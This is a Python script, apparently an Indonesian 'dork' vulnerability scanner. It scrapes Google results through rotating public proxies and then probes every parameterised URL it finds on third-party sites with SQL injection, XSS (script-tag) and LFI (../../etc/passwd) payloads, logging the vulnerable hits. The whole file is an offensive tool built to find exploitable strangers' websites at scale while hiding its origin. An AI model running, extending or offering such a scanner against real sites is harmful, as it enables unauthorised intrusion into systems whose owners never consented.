
import requests
import re
import urllib.parse
import threading
import time
import random
from queue import Queue

USE_PROXIES = True
PROXIES = [
    "http://51.158.154.173:3128",
    "http://185.199.229.156:7492",
    "http://103.152.112.145:80"
]

THREADS = 5
OUTPUT_FILE = "hasil_scan.txt"
SHODAN_API_KEY = ""

headers = {
    "User-Agent": "Mozilla/5.0"
}

def google_dork_search(dork, max_results=20):
    results = []
    for start in range(0, max_results, 10):
        proxy = {"http": random.choice(PROXIES)} if USE_PROXIES else None
        url = f"https://www.google.com/search?q={urllib.parse.quote_plus(dork)}&start={start}"
        try:
            r = requests.get(url, headers=headers, proxies=proxy, timeout=10)
            links = re.findall(r'/url\?q=(https?://[^&]+)&', r.text)
            results.extend(links)
        except Exception as e:
            print(f"[!] Error Google Dorking: {e}")
        time.sleep(1)
    return list(set(results))

def detect_cms(url):
    try:
        r = requests.get(url, headers=headers, timeout=5)
        html = r.text.lower()
        if "wp-content" in html or "wordpress" in html:
            return "WordPress"
        elif "joomla" in html:
            return "Joomla"
        elif "drupal" in html:
            return "Drupal"
        elif "laravel" in html or "x-csrf-token" in r.headers:
            return "Laravel"
        else:
            return "Unknown"
    except:
        return "Unknown"

def test_sql_injection(url):
    test_url = url + "'"
    try:
        r = requests.get(test_url, timeout=5)
        if "sql" in r.text.lower() or "syntax" in r.text.lower():
            return True
    except:
        pass
    return False

def test_xss(url):
    payload = "<script>alert(1337)</script>"
    try:
        test_url = url + urllib.parse.quote_plus(payload)
        r = requests.get(test_url, timeout=5)
        if payload in r.text:
            return True
    except:
        pass
    return False

def test_lfi(url):
    test_url = url + "../../etc/passwd"
    try:
        r = requests.get(test_url, timeout=5)
        if "root:x:" in r.text:
            return True
    except:
        pass
    return False

def check_shodan(ip):
    if not SHODAN_API_KEY:
        return "N/A"
    try:
        resp = requests.get(f"https://api.shodan.io/shodan/host/{ip}?key={SHODAN_API_KEY}")
        if resp.status_code == 200:
            data = resp.json()
            return f"{data.get('org', 'Unknown')} | {data.get('os', 'Unknown')}"
    except:
        pass
    return "Unknown"

def worker():
    while not q.empty():
        url = q.get()
        try:
            print(f"[~] Scan: {url}")
            cms = detect_cms(url)
            sql = test_sql_injection(url)
            xss = test_xss(url)
            lfi = test_lfi(url)
            result = f"{url} | CMS: {cms} | SQLi: {sql} | XSS: {xss} | LFI: {lfi}"
            print(" =>", result)
            with open(OUTPUT_FILE, "a") as f:
                f.write(result + "\n")
        except Exception as e:
            print(f"[!] Error on {url}: {e}")
        q.task_done()

if __name__ == "__main__":
    print("="*50)
    print("     KHAN DORK MASTER - VULN SCANNER")
    print("="*50)

    dork = input("[?] Masukkan Google Dork: ")
    links = google_dork_search(dork, max_results=20)

    print(f"\n[+] Dapat {len(links)} link dari Google.")
    q = Queue()

    for url in links:
        if "?" in url:
            q.put(url)

    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print(f"\n[✓] Scan selesai. Hasil disimpan di: {OUTPUT_FILE}")
